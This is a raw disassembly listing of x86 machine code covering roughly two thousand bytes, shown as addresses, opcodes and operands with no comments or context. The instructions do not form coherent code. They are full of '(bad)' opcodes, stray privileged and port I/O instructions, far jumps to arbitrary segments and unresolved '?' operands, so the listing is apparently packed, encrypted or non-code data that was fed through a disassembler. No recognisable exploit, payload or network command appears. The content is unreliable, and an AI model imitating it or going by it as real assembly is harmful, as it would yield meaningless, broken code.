  419922:	adc    BYTE PTR [ebp+0x6f873756],0x33
  419929:	rsm    
  41992b:	sub    ah,BYTE PTR [ebp-0xb8957f4]
  419931:	data16 fild WORD PTR [ecx+0x35d7581e]
  419938:	add    al,BYTE PTR [edx-0x2f]
  41993b:	xchg   edi,eax
  41993c:	test   eax,0x55c3df4e
  419941:	aam    0x4e
  419943:	push   cs
  419944:	mov    DWORD PTR [ebx-0x4f],ecx
  419947:	lahf   
  419948:	adc    al,0x9e
  41994a:	and    bl,dh
  41994c:	mov    ds:0xd9de077b,eax
  419951:	adc    al,0x65
  419953:	xchg   edi,eax
  419954:	call   0xf75de92d
  419959:	adc    cl,BYTE PTR [edi]
  41995b:	mov    edx,0xfd38ab18
  419960:	dec    ecx
  419961:	jmp    0x41994d
  419963:	ret    
  419964:	lahf   
  419965:	ins    DWORD PTR es:[edi],dx
  419966:	fst    st(4)
  419968:	xor    al,ah
  41996a:	jle    0x41997b
  41996c:	pop    esp
  41996d:	scas   eax,DWORD PTR es:[edi]
  41996e:	or     eax,edx
  419970:	pop    ebx
  419971:	hlt    
  419972:	push   eax
  419973:	rol    al,0xb0
  419976:	dec    eax
  419977:	fistp  DWORD PTR [ecx-0x5f]
  41997a:	retf   
  41997b:	js     0x419999
  41997d:	sti    
  41997e:	mov    ch,0x26
  419980:	and    DWORD PTR es:[ebp+0x5b],edi
  419984:	ja     0x41998a
  419986:	mov    eax,DWORD PTR ds:0xd0b714dd
  41998c:	dec    ebp
  41998d:	retf   0xfc77
  419990:	loope  0x4199e8
  419992:	mov    bh,bh
  419994:	cmp    cl,BYTE PTR [ebx-0x7e7abec]
  41999a:	popf   
  41999b:	ficomp WORD PTR [edx+eiz*1]
  41999e:	rcl    DWORD PTR [eax],0xcb
  4199a1:	pop    edi
  4199a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199a3:	push   ecx
  4199a4:	arpl   WORD PTR [eax],cx
  4199a6:	iret   
  4199a7:	repz jg 0x41998d
  4199aa:	fnsave [ecx-0x7c07711f]
  4199b0:	xchg   ecx,eax
  4199b1:	mov    ds:0x5a7d1e48,eax
  4199b6:	(bad)  
  4199b7:	fnsave [ebp+0x3acb74e]
  4199bd:	pop    ebp
  4199be:	mov    bh,dh
  4199c0:	dec    ecx
  4199c1:	cli    
  4199c2:	dec    esp
  4199c3:	pop    ss
  4199c4:	pushf  
  4199c5:	ja     0x419974
  4199c7:	mov    dh,0x18
  4199c9:	pop    es
  4199ca:	stos   DWORD PTR es:[edi],eax
  4199cb:	xadd   DWORD PTR [esi+0x3],ebp
  4199cf:	in     eax,0x49
  4199d1:	ret    0x9e4b
  4199d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199d5:	pop    ebx
  4199d6:	xchg   BYTE PTR [esi-0x449ee337],bh
  4199dc:	push   edi
  4199dd:	or     al,0x58
  4199df:	inc    edx
  4199e0:	mov    ds:0xa1aa1038,eax
  4199e5:	js     0x419986
  4199e7:	dec    eax
  4199e8:	lock test BYTE PTR ds:0x804ed994,dh
  4199ef:	mov    al,BYTE PTR [ecx-0x10]
  4199f2:	aam    0xf0
  4199f4:	in     al,0xd3
  4199f6:	xor    al,BYTE PTR [esi]
  4199f8:	inc    DWORD PTR [edi]
  4199fa:	out    dx,al
  4199fb:	mov    al,ds:0x2076534a
  419a00:	pop    edx
  419a01:	js     0x4199c6
  419a03:	dec    edi
  419a04:	and    dh,bh
  419a06:	sahf   
  419a07:	pop    ecx
  419a08:	mov    eax,ds:0xc883a494
  419a0d:	enter  0x376b,0x8c
  419a11:	sbb    edx,DWORD PTR [ebp+0x2e]
  419a14:	(bad)  
  419a15:	pop    eax
  419a16:	mov    esi,eax
  419a18:	js     0x419a86
  419a1a:	aas    
  419a1b:	mov    esp,0xdf89d4fd
  419a20:	js     0x419a2a
  419a22:	push   edx
  419a23:	jmp    0x4199f0
  419a25:	addr16 mov esp,0xfccdb5a0
  419a2b:	mov    bh,0xa3
  419a2d:	(bad)  
  419a2f:	imul   esp,esi,0xe61898d8
  419a35:	bound  eax,QWORD PTR es:[eax+0x1a65f9dc]
  419a3c:	rol    eax,1
  419a3e:	mov    bl,0xb5
  419a40:	scas   eax,DWORD PTR es:[edi]
  419a41:	cmc    
  419a42:	loope  0x419a0e
  419a44:	scas   al,BYTE PTR es:[edi]
  419a45:	xchg   ebp,eax
  419a46:	cmp    BYTE PTR [esp+edi*1-0x7e6ec8f],bh
  419a4d:	push   es
  419a4e:	pop    ebx
  419a4f:	into   
  419a50:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  419a52:	jge    0x419ad2
  419a54:	adc    dh,0x61
  419a57:	cmp    esp,DWORD PTR [edi-0x2a]
  419a5a:	pusha  
  419a5b:	add    DWORD PTR [ebx-0x120097a3],ebp
  419a61:	fs ins BYTE PTR es:[edi],dx
  419a63:	lds    edi,FWORD PTR [edx+edx*4+0x28]
  419a67:	out    dx,al
  419a68:	das    
  419a69:	sbb    BYTE PTR [ecx+eiz*4],0x81
  419a6d:	xor    al,0x82
  419a6f:	repnz and eax,DWORD PTR [ecx-0x19]
  419a73:	mov    esi,0xd7431d14
  419a78:	pop    DWORD PTR [edx]
  419a7a:	mov    esi,0x79ee16e4
  419a7f:	dec    esp
  419a80:	inc    esp
  419a81:	test   DWORD PTR [ebx+0x857c1e0],edx
  419a87:	ds jbe 0x419a97
  419a8a:	or     DWORD PTR [eax],esi
  419a8c:	ds scas eax,DWORD PTR es:[edi]
  419a8e:	and    al,0x4d
  419a90:	ins    BYTE PTR es:[edi],dx
  419a91:	mov    ds:0x967bbd7c,al
  419a96:	or     esp,ebx
  419a98:	test   DWORD PTR [edx],0x64b9f829
  419a9e:	or     esi,DWORD PTR [eax+0x45]
  419aa1:	cwde   
  419aa2:	cmp    ebx,esp
  419aa4:	loopne 0x419a43
  419aa6:	std    
  419aa7:	stc    
  419aa8:	mov    edx,0xffef1341
  419aad:	cmc    
  419aae:	and    al,0x3f
  419ab0:	push   eax
  419ab1:	inc    ebp
  419ab2:	push   esp
  419ab3:	push   esi
  419ab4:	loopne 0x419a78
  419ab6:	mov    ebp,0xb535f46b
  419abb:	sbb    bl,BYTE PTR [edx+0x58]
  419abe:	jp     0x419ae7
  419ac0:	cmp    esp,0xffffffd7
  419ac3:	mov    esi,DWORD PTR [edi]
  419ac5:	or     ch,dh
  419ac7:	popf   
  419ac8:	sub    eax,0x94122e92
  419acd:	and    DWORD PTR cs:[esi-0x62],eax
  419ad1:	pop    ebp
  419ad2:	pop    edx
  419ad3:	pusha  
  419ad4:	fisubr WORD PTR [ecx]
  419ad6:	scas   al,BYTE PTR es:[edi]
  419ad7:	xor    al,dh
  419ad9:	and    edi,DWORD PTR [ecx+0x61]
  419adc:	mov    eax,cs:0x449ebd8e
  419ae2:	cmp    al,0x15
  419ae4:	mov    ah,0xd6
  419ae6:	add    ecx,DWORD PTR [eiz*8+0xeb40f4d]
  419aed:	ss cmp al,0x1c
  419af0:	mov    eax,ds:0x4c4f2785
  419af5:	or     eax,0xa12ad542
  419afa:	sub    cl,dh
  419afc:	repnz sub dh,ah
  419aff:	ja     0x419b13
  419b01:	into   
  419b02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b03:	add    BYTE PTR [edx+eiz*8+0x75],dh
  419b07:	cmp    esi,DWORD PTR [esi+0x54]
  419b0a:	daa    
  419b0b:	mov    ss,eax
  419b0d:	arpl   dx,cx
  419b0f:	mov    al,0x8d
  419b11:	cmp    ebx,DWORD PTR [edx]
  419b13:	pushw  0xbff6
  419b17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b18:	icebp  
  419b19:	fimul  DWORD PTR [ecx-0x13635402]
  419b1f:	jmp    0xe835:0xba731ff1
  419b26:	call   FWORD PTR [esi]
  419b28:	mov    ds:0xff633f32,al
  419b2d:	adc    BYTE PTR [edx],cl
  419b2f:	cmp    ecx,DWORD PTR [esi]
  419b31:	call   0xd3a9:0x67453776
  419b38:	mov    dl,0xaf
  419b3a:	retf   0x3ba9
  419b3d:	imul   ebx,DWORD PTR [eax+0xa8de2ce],0x66335bf9
  419b47:	and    DWORD PTR [edx+0x68a7f05d],0xffffff8a
  419b4e:	push   0x78
  419b50:	rcl    DWORD PTR [eax+edi*8],cl
  419b53:	retf   
  419b54:	xchg   esi,eax
  419b55:	clc    
  419b56:	cmp    dh,BYTE PTR [ecx+0x19]
  419b59:	pop    ecx
  419b5a:	test   ecx,0x4aa445e8
  419b60:	cmp    dh,BYTE PTR [ebx-0x3b63fe7e]
  419b66:	or     DWORD PTR [ebx+0x5],ebp
  419b69:	stc    
  419b6a:	sub    eax,0x61d1593f
  419b6f:	dec    ecx
  419b70:	pop    eax
  419b71:	mov    ecx,0xa3ef5694
  419b76:	push   ebp
  419b77:	or     BYTE PTR [eax+edi*8-0x62],dh
  419b7b:	inc    ebp
  419b7c:	xor    eax,0x2df517bf
  419b81:	fs jo  0x419b6c
  419b84:	fst    DWORD PTR ds:0x4a9dac9f
  419b8a:	jecxz  0x419bc8
  419b8c:	aad    0x3d
  419b8e:	lea    edi,[ecx+0x2b]
  419b91:	cmovno edx,DWORD PTR [ecx+0x2f]
  419b95:	mov    dh,dh
  419b97:	(bad)  
  419b98:	arpl   WORD PTR [esp+ebp*8+0x10],ax
  419b9c:	xor    dh,al
  419b9e:	dec    edx
  419b9f:	jg     0x419b3a
  419ba1:	push   ss
  419ba2:	lahf   
  419ba3:	outs   dx,DWORD PTR ds:[esi]
  419ba4:	pop    ecx
  419ba5:	das    
  419ba6:	enter  0xc7fb,0xd8
  419baa:	les    ebp,FWORD PTR [esp+edx*8+0x7112c6d7]
  419bb1:	pop    edx
  419bb2:	out    0xd9,eax
  419bb4:	stos   BYTE PTR es:[edi],al
  419bb5:	(bad)  
  419bb6:	scas   al,BYTE PTR es:[edi]
  419bb7:	and    al,BYTE PTR [esi]
  419bb9:	and    al,0x35
  419bbb:	cs xchg edi,eax
  419bbd:	pop    ss
  419bbe:	xchg   ebp,eax
  419bbf:	xor    ebx,esp
  419bc1:	(bad)  
  419bc2:	adc    DWORD PTR [ebp-0x50943ae4],esi
  419bc8:	cs dec ebp
  419bca:	jne    0x419be3
  419bcc:	fldcw  WORD PTR [ecx+0x21]
  419bcf:	lea    edx,[ebx+0x6940f8c6]
  419bd5:	dec    eax
  419bd6:	(bad)  
  419bd7:	shl    BYTE PTR [eax+0x67],cl
  419bda:	popf   
  419bdb:	xchg   ebx,eax
  419bdc:	inc    ebp
  419bdd:	sub    eax,0x49ef2b50
  419be2:	or     eax,DWORD PTR [edi-0x37]
  419be5:	and    ebx,DWORD PTR [edx]
  419be7:	or     esi,ebp
  419be9:	sbb    ebx,DWORD PTR [ebx]
  419beb:	mov    ebp,0x5653ab25
  419bf0:	jmp    0x41a17a
  419bf5:	in     al,0xf8
  419bf7:	inc    esi
  419bf8:	scas   eax,DWORD PTR es:[edi]
  419bf9:	sbb    ch,BYTE PTR [eax]
  419bfb:	push   esp
  419bfc:	mov    eax,0x72b8fca1
  419c01:	dec    ebx
  419c02:	outs   dx,DWORD PTR ds:[esi]
  419c03:	cmp    dh,BYTE PTR [ecx+eiz*1+0x3d160c3b]
  419c0a:	add    al,0x16
  419c0c:	push   ss
  419c0d:	jmp    0x4630158a
  419c12:	jae    0x419bde
  419c14:	mov    BYTE PTR [edx-0xaab99b2],ah
  419c1a:	push   0xb7d405bc
  419c1f:	cld    
  419c20:	fild   QWORD PTR [eax+0x79]
  419c23:	mov    ds,WORD PTR [ebp+0x10]
  419c26:	mov    ebp,?
  419c28:	pop    edi
  419c29:	(bad)  
  419c2a:	(bad)  
  419c2c:	xchg   ebx,eax
  419c2d:	ins    DWORD PTR es:[edi],dx
  419c2e:	pop    ebp
  419c2f:	in     eax,dx
  419c30:	outs   dx,BYTE PTR ds:[esi]
  419c31:	stc    
  419c32:	lods   eax,DWORD PTR ds:[esi]
  419c33:	add    DWORD PTR [edi-0x6ade2c3f],ecx
  419c39:	xor    eax,0xbaeb1cab
  419c3e:	cmp    eax,0xac5cfb1f
  419c43:	mov    esi,0x864b706d
  419c48:	arpl   WORD PTR [ecx],di
  419c4a:	and    bl,ch
  419c4c:	cmp    eax,0x85a2ecdf
  419c51:	js     0x419cc5
  419c53:	add    eax,0xbdcd29c2
  419c58:	and    al,0x2e
  419c5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c5b:	mov    es,WORD PTR [esi+0x25]
  419c5e:	ja     0x419cae
  419c60:	adc    BYTE PTR [ebx],dh
  419c62:	ins    DWORD PTR es:[edi],dx
  419c63:	shr    BYTE PTR [ebp+0x556ab84f],1
  419c69:	push   esi
  419c6a:	je     0x419c31
  419c6c:	cs sub eax,0xbd75a210
  419c72:	adc    ecx,ebx
  419c74:	test   ah,al
  419c76:	iret   
  419c77:	outs   dx,DWORD PTR ds:[esi]
  419c78:	xor    BYTE PTR [edx-0x49],dl
  419c7b:	lods   al,BYTE PTR fs:[esi]
  419c7d:	fstp   TBYTE PTR [eax-0x66]
  419c80:	in     eax,0xd4
  419c82:	dec    edi
  419c83:	stos   BYTE PTR es:[edi],al
  419c84:	js     0x419cb1
  419c86:	add    eax,0x87b5f4df
  419c8b:	hlt    
  419c8c:	adc    DWORD PTR [edx+0x47fd094e],edx
  419c92:	nop
  419c93:	stos   BYTE PTR es:[edi],al
  419c94:	outs   dx,DWORD PTR ds:[esi]
  419c95:	jb     0x419ce4
  419c97:	and    eax,0xf5331b1e
  419c9c:	xor    eax,0x80337474
  419ca1:	push   esi
  419ca2:	js     0x419cb6
  419ca4:	and    DWORD PTR [edx],ebx
  419ca6:	fnsave fs:[ebx+0x63df9879]
  419cad:	push   edx
  419cae:	xchg   esp,eax
  419caf:	pusha  
  419cb0:	cli    
  419cb1:	lods   eax,DWORD PTR ds:[esi]
  419cb2:	cmp    al,0x7b
  419cb4:	shl    DWORD PTR [ebp+0x60699199],0x58
  419cbb:	ss out 0x98,eax
  419cbe:	adc    BYTE PTR ds:0x5f41121,dh
  419cc4:	popf   
  419cc5:	rol    DWORD PTR [ecx+ebp*4],0x0
  419cc9:	hlt    
  419cca:	ja     0x419c82
  419ccc:	or     cl,BYTE PTR [edx-0x37f5822b]
  419cd2:	push   cs
  419cd3:	scas   al,BYTE PTR es:[edi]
  419cd4:	xchg   esp,eax
  419cd5:	mov    ebx,DWORD PTR [ecx]
  419cd7:	and    BYTE PTR [edi-0x38],bl
  419cda:	add    edi,DWORD PTR [eax+0x6e]
  419cdd:	xor    eax,0xc84b62e6
  419ce2:	imul   ebx,DWORD PTR [edi+0x2f],0x7ad9cb91
  419ce9:	xchg   esp,eax
  419cea:	or     eax,0x8bb7c72
  419cef:	mov    ?,WORD PTR [ecx-0x80]
  419cf2:	das    
  419cf3:	jmp    0x1140:0xa2178967
  419cfa:	sub    ecx,DWORD PTR [ebx]
  419cfc:	je     0x419ceb
  419cfe:	nop
  419cff:	or     al,0xb7
  419d01:	lahf   
  419d02:	inc    eax
  419d03:	or     DWORD PTR [esi+0x73087d2b],0x9daa876d
  419d0d:	xor    ebp,DWORD PTR [ebx]
  419d0f:	fistp  DWORD PTR ds:0x2f691203
  419d15:	push   0xa49e9f04
  419d1a:	in     al,dx
  419d1b:	neg    edi
  419d1d:	out    0xe2,eax
  419d1f:	loop   0x419d65
  419d21:	xor    esp,edi
  419d23:	popa   
  419d24:	cs cld 
  419d26:	fbld   TBYTE PTR [eax+0x61cdf2d1]
  419d2c:	mov    ds:0xa24815fc,al
  419d31:	inc    edx
  419d32:	dec    esi
  419d33:	leave  
  419d34:	gs iret 
  419d36:	clc    
  419d37:	inc    edi
  419d38:	fs lock inc eax
  419d3b:	fwait
  419d3c:	ins    DWORD PTR es:[edi],dx
  419d3d:	dec    eax
  419d3e:	and    DWORD PTR [ebx],0x1aefab33
  419d44:	shl    cl,0x79
  419d47:	test   bh,0x2d
  419d4a:	es dec eax
  419d4c:	sub    eax,0xdba8f594
  419d51:	gs into 
  419d53:	(bad)  
  419d54:	cdq    
  419d55:	into   
  419d56:	or     DWORD PTR es:[esi+0x630cff32],edx
  419d5d:	dec    edi
  419d5e:	push   es
  419d5f:	push   ecx
  419d60:	xchg   ebx,eax
  419d61:	or     ecx,DWORD PTR [ebp-0x3]
  419d64:	pop    ebx
  419d65:	xor    dl,BYTE PTR [ebx-0x3df7327b]
  419d6b:	sub    al,0x36
  419d6d:	out    0xcf,al
  419d6f:	imul   ebp,DWORD PTR [ebx+0x40],0xfd8e2341
  419d76:	sahf   
  419d77:	mov    dl,0xee
  419d79:	push   esp
  419d7a:	push   edi
  419d7b:	les    esp,FWORD PTR [ecx]
  419d7d:	dec    edx
  419d7e:	ins    DWORD PTR es:[edi],dx
  419d7f:	jne    0x419df9
  419d81:	addr16 ret 0xa11d
  419d85:	pop    edx
  419d86:	(bad)  
  419d88:	into   
  419d89:	jg     0x419d55
  419d8b:	mov    ah,0x6f
  419d8d:	test   al,0x71
  419d8f:	and    ah,BYTE PTR [ecx+0x7a833ed8]
  419d95:	sar    BYTE PTR [esi],1
  419d97:	scas   eax,DWORD PTR es:[edi]
  419d98:	sub    BYTE PTR [edx-0x7f],al
  419d9b:	and    eax,0xfcf05c8e
  419da0:	sahf   
  419da1:	stos   DWORD PTR es:[edi],eax
  419da2:	sub    ah,BYTE PTR [ebp-0x4]
  419da5:	test   al,0xc9
  419da7:	inc    edi
  419da8:	sbb    bh,cl
  419daa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dab:	xlat   BYTE PTR ds:[ebx]
  419dac:	shl    DWORD PTR [ecx+0x3b],1
  419daf:	pop    eax
  419db0:	daa    
  419db1:	xor    cl,BYTE PTR [ebp+0x551baef6]
  419db7:	push   edx
  419db8:	jp     0x419e34
  419dba:	cwde   
  419dbb:	dec    esi
  419dbc:	in     eax,0x34
  419dbe:	sbb    al,0x1f
  419dc0:	addr16 popa 
  419dc2:	or     dl,BYTE PTR [edx-0x7c]
  419dc5:	mov    WORD PTR [ebx+0x4b],gs
  419dc8:	bnd jge 0x419d63
  419dcb:	or     BYTE PTR [esi+0x431d56e1],ah
  419dd1:	sbb    edi,esp
  419dd3:	or     ebx,ebx
  419dd5:	fmul   QWORD PTR [ebp-0x78]
  419dd8:	mov    ebx,0xc355f82e
  419ddd:	sub    ecx,DWORD PTR [eax-0x3eed44a7]
  419de3:	je     0x419d84
  419de5:	loopne 0x419dc1
  419de7:	jmp    0x419d6f
  419de9:	xchg   edx,eax
  419dea:	scas   eax,DWORD PTR es:[edi]
  419deb:	mov    dl,0x55
  419ded:	call   0x49fa:0xda440826
  419df4:	xchg   ebx,eax
  419df5:	inc    ecx
  419df6:	cdq    
  419df7:	in     al,0xc3
  419df9:	pop    ds
  419dfa:	call   0xb4dc265c
  419dff:	fstp   DWORD PTR ds:0xee05a6cc
  419e05:	neg    DWORD PTR [ebx]
  419e07:	cmp    eax,0x3af04b1f
  419e0c:	push   0x4e
  419e0e:	jg     0x419e52
  419e10:	xor    eax,0xffffffa7
  419e13:	out    0xd5,al
  419e15:	ror    DWORD PTR [edi+0x2a],1
  419e18:	inc    eax
  419e19:	adc    DWORD PTR [esi+0x43],esp
  419e1c:	xchg   edi,eax
  419e1d:	in     eax,dx
  419e1e:	test   BYTE PTR [edx+esi*1-0x1e],al
  419e22:	cld    
  419e23:	xor    al,0x80
  419e25:	stc    
  419e26:	xchg   esp,eax
  419e27:	xchg   esi,eax
  419e28:	call   0xa351:0xd9bf0c61
  419e2f:	cmp    al,0xdc
  419e31:	dec    ecx
  419e32:	rol    BYTE PTR [edi],1
  419e34:	mov    eax,0x6a79f445
  419e39:	sub    BYTE PTR [ebx+0x1a0c0595],bl
  419e3f:	inc    ebp
  419e40:	add    bl,BYTE PTR [esi]
  419e42:	loop   0x419e7d
  419e44:	inc    ecx
  419e45:	daa    
  419e46:	shr    DWORD PTR [ecx-0x62],1
  419e49:	xor    eax,0x7dbb0351
  419e4e:	jno    0x419dd1
  419e50:	(bad)  
  419e51:	(bad)  
  419e52:	sbb    cl,BYTE PTR [esi]
  419e54:	jecxz  0x419e97
  419e56:	mov    ch,BYTE PTR [ecx-0x37b50aa3]
  419e5c:	inc    esp
  419e5d:	dec    esi
  419e5e:	pop    ecx
  419e5f:	retf   0x71f5
  419e62:	sbb    edx,DWORD PTR [eax-0x682f9944]
  419e68:	ss ja  0x419e59
  419e6b:	shl    DWORD PTR [esi+0x17],1
  419e6e:	pop    eax
  419e6f:	and    BYTE PTR [esi],bh
  419e71:	add    bl,BYTE PTR [ebx-0x42]
  419e74:	add    dl,BYTE PTR [edx-0x1e]
  419e77:	arpl   si,sp
  419e79:	gs push esi
  419e7b:	sub    BYTE PTR [eax-0x2701fb7],0x28
  419e82:	js     0x419e3b
  419e84:	loop   0x419e9d
  419e86:	int    0xb8
  419e88:	test   DWORD PTR [eax-0x6a],ebx
  419e8b:	popf   
  419e8c:	push   edx
  419e8d:	cmc    
  419e8e:	xchg   esi,eax
  419e8f:	dec    esi
  419e90:	cmp    al,BYTE PTR [eax+0x32b624cc]
  419e96:	adc    BYTE PTR [edi-0x1b],dl
  419e99:	(bad)  
  419e9a:	fisubr DWORD PTR [esi+0x36]
  419e9d:	xor    eax,0xe05c1038
  419ea2:	fild   WORD PTR [ecx]
  419ea4:	sahf   
  419ea5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ea6:	jbe    0x419e7f
  419ea8:	sahf   
  419ea9:	aad    0xfa
  419eab:	mov    ebx,0xb09f77cd
  419eb0:	ins    DWORD PTR es:[edi],dx
  419eb1:	dec    edi
  419eb2:	and    BYTE PTR [ecx+0x7b],bl
  419eb5:	mov    ecx,0x3f9b702b
  419eba:	mov    ebp,0x705b0ef9
  419ebf:	out    0xe,eax
  419ec1:	push   esi
  419ec2:	inc    edx
  419ec3:	push   esp
  419ec4:	inc    ecx
  419ec5:	clc    
  419ec6:	xchg   esi,eax
  419ec7:	xor    al,0x76
  419ec9:	jo     0x419f02
  419ecb:	push   ebx
  419ecc:	pop    eax
  419ecd:	out    dx,eax
  419ece:	pop    edi
  419ecf:	mov    edi,0xdfe13668
  419ed4:	mov    eax,ds:0xf9267e90
  419ed9:	sub    al,0x80
  419edb:	mov    ds:0x28fd9eef,al
  419ee0:	sub    esi,DWORD PTR [esi-0x5d]
  419ee3:	ret    0xe63b
  419ee6:	fstp   TBYTE PTR [edx+edi*2]
  419ee9:	sub    DWORD PTR [ebp-0x39cca04],edx
  419eef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ef0:	mov    al,ds:0x54933943
  419ef5:	mov    ds:0xacc19cd9,eax
  419efa:	xor    ebx,DWORD PTR [edi-0x35849028]
  419f00:	inc    ecx
  419f01:	sbb    cl,BYTE PTR [esi+0x69]
  419f04:	rcl    DWORD PTR ds:0x70a0f00d,cl
  419f0a:	pushf  
  419f0b:	imul   edx,DWORD PTR [ecx],0x77
  419f0e:	add    eax,0x4616d3a8
  419f13:	mov    dh,dl
  419f15:	xor    BYTE PTR [edx+0x659224ab],al
  419f1b:	imul   edi,DWORD PTR [esi+0x637b1948],0x5c
  419f22:	push   es
  419f23:	pop    ecx
  419f24:	sar    DWORD PTR [edi-0x154dd3cd],0x26
  419f2b:	push   ebx
  419f2c:	cmc    
  419f2d:	push   0x291dcacf
  419f32:	jo     0x419ef7
  419f34:	mov    es,WORD PTR [eax-0x2a]
  419f37:	sbb    al,0x92
  419f39:	cld    
  419f3a:	cdq    
  419f3b:	pop    ds
  419f3c:	pushf  
  419f3d:	ds jge 0x419f58
  419f40:	hlt    
  419f41:	and    DWORD PTR [esi],esi
  419f43:	popa   
  419f44:	aad    0xf3
  419f46:	in     eax,0x1a
  419f48:	fs test al,0xca
  419f4b:	adc    ebx,ecx
  419f4d:	fs ins DWORD PTR es:[edi],dx
  419f4f:	ficom  WORD PTR [esi-0x77c32bb]
  419f55:	int3   
  419f56:	lods   eax,DWORD PTR ds:[esi]
  419f57:	add    DWORD PTR [eax+ecx*4+0x67],ecx
  419f5b:	shr    BYTE PTR [edx],cl
  419f5d:	mov    dl,0x6
  419f5f:	sbb    DWORD PTR [edi+0x1f],ecx
  419f62:	or     cl,al
  419f64:	push   cs
  419f65:	ret    
  419f66:	je     0x419f67
  419f68:	jmp    0x5eca:0xcd547f0d
  419f6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f70:	xchg   esp,eax
  419f71:	data16 jbe 0x419f96
  419f74:	fistp  QWORD PTR [edx+0x5f]
  419f77:	call   0xcb75:0xd4646b94
  419f7e:	div    DWORD PTR [edx-0x67025cda]
  419f84:	pop    ss
  419f85:	xor    eax,0xd9732c1c
  419f8a:	or     bl,BYTE PTR [ecx]
  419f8c:	or     eax,0xa5aa40c8
  419f91:	ficom  WORD PTR [ebx-0x60]
  419f94:	cld    
  419f95:	inc    esp
  419f96:	icebp  
  419f97:	xchg   edx,eax
  419f98:	(bad)  
  419f99:	aam    0xe
  419f9b:	lock in al,0xeb
  419f9e:	inc    eax
  419f9f:	in     al,dx
  419fa0:	jne    0x419f8f
  419fa2:	xchg   esi,eax
  419fa3:	(bad)
  419fa6:	cmp    eax,0xc0c7cf23
  419fab:	mov    ecx,0x7ace08c8
  419fb0:	fs mov edx,0x7d72d3f6
  419fb6:	hlt    
  419fb7:	jge    0x419fd0
  419fb9:	lock test al,0x91
  419fbc:	lahf   
  419fbd:	mov    dl,0x3d
  419fbf:	or     esi,DWORD PTR [ecx+0x31]
  419fc2:	dec    edx
  419fc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fc4:	pop    ecx
  419fc5:	(bad)  
  419fc6:	in     al,dx
  419fc7:	or     DWORD PTR [esi],ebx
  419fc9:	sub    ah,BYTE PTR [edi-0x14]
  419fcc:	shl    DWORD PTR [esi+0x2ac886e9],1
  419fd2:	inc    esp
  419fd3:	adc    ebp,ecx
  419fd5:	scas   eax,DWORD PTR es:[edi]
  419fd6:	mov    ds:0x6c5e559f,al
  419fdb:	ret    
  419fdc:	lods   eax,DWORD PTR ds:[esi]
  419fde:	rcl    BYTE PTR [edx+esi*8+0x77881aae],0x4e
  419fe6:	dec    edi
  419fe7:	inc    esp
  419fe8:	dec    edi
  419fe9:	sbb    DWORD PTR [ebx-0x53],esi
  419fec:	fsubr  DWORD PTR [edx+0x19]
  419fef:	ja     0x419fd4
  419ff1:	sbb    dh,cl
  419ff3:	push   edi
  419ff4:	xlat   BYTE PTR ds:[ebx]
  419ff5:	jle    0x419fb1
  419ff7:	push   cs
  419ff8:	cmp    BYTE PTR [ebx-0x3c],bl
  419ffb:	mov    ds:0x1b8d325b,eax
  41a000:	les    edi,FWORD PTR [esi+0x48]
  41a003:	mov    ebx,0x30131689
  41a008:	outs   dx,BYTE PTR ds:[esi]
  41a009:	push   eax
  41a00a:	daa    
  41a00b:	pushf  
  41a00c:	inc    ecx
  41a00d:	inc    eax
  41a00e:	clc    
  41a00f:	dec    BYTE PTR [ebx+0x2aae52c1]
  41a015:	sbb    BYTE PTR [edx-0x5d4626e4],dh
  41a01b:	ror    BYTE PTR [esi-0x2f42ffb2],1
  41a021:	scas   al,BYTE PTR es:[edi]
  41a022:	xor    eax,DWORD PTR [esi-0x5f]
  41a025:	mov    dh,0x11
  41a027:	sub    eax,0x3c0137d8
  41a02c:	push   edi
  41a02d:	dec    ebx
  41a02e:	push   edx
  41a02f:	sahf   
  41a030:	aam    0x75
  41a032:	xor    DWORD PTR [ebp+ebx*2-0x612856bb],esi
  41a039:	cli    
  41a03a:	xor    edx,DWORD PTR [ecx]
  41a03c:	(bad)  
  41a03d:	xor    al,0x77
  41a03f:	dec    esp
  41a040:	int    0xf3
  41a042:	cli    
  41a043:	fs cmp eax,0xe7671c36
  41a049:	xor    ch,BYTE PTR [edi]
  41a04b:	add    dh,BYTE PTR ds:0xa8f7849f
  41a051:	jp     0x419fe7
  41a053:	jmp    0x41a06c
  41a055:	mov    cl,0x9
  41a057:	dec    ebp
  41a058:	add    eax,0x84ec6e80
  41a05d:	mov    ebx,0x982ccebe
  41a062:	test   DWORD PTR [esi+eax*8+0x1a767e31],ebx
  41a069:	mov    dh,0x8f
  41a06b:	inc    esi
  41a06c:	int    0x3f
  41a06e:	jbe    0x41a076
  41a070:	lods   al,BYTE PTR ds:[esi]
  41a071:	cld    
  41a072:	xchg   esp,eax
  41a073:	ret    0xcf77
  41a076:	cmp    cl,BYTE PTR [edx+0x4a]
  41a079:	loop   0x41a02f
  41a07b:	or     dl,BYTE PTR [edx+0x6ef700b9]
  41a081:	jg     0x41a032
  41a083:	fcom   QWORD PTR [ebx]
  41a085:	xlat   BYTE PTR ds:[ebx]
  41a086:	pop    eax
  41a087:	xchg   edi,eax
  41a088:	mov    al,ds:0x6c34c7e4
  41a08d:	ja     0x41a078
  41a08f:	ja     0x41a077
  41a091:	out    0xaf,eax
  41a093:	sub    eax,0x2a3d0c4c
  41a099:	push   0xd1437867
  41a09e:	cmp    DWORD PTR [esp+edx*4],esp
  41a0a1:	sbb    BYTE PTR [edx-0x48],dl
  41a0a4:	and    esi,ebx
  41a0a6:	shl    esi,0x45
  41a0a9:	clc    
  41a0aa:	adc    al,0xc8
  41a0ac:	jecxz  0x41a0d0
  41a0ae:	or     ah,BYTE PTR [esi+ecx*4]
  41a0b1:	inc    esi
  41a0b2:	lahf   
  41a0b3:	inc    ecx
  41a0b4:	test   BYTE PTR [esi-0x28508479],ah
  41a0ba:	out    0xc1,al
  41a0bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0bd:	or     al,0xab
  41a0bf:	dec    ecx
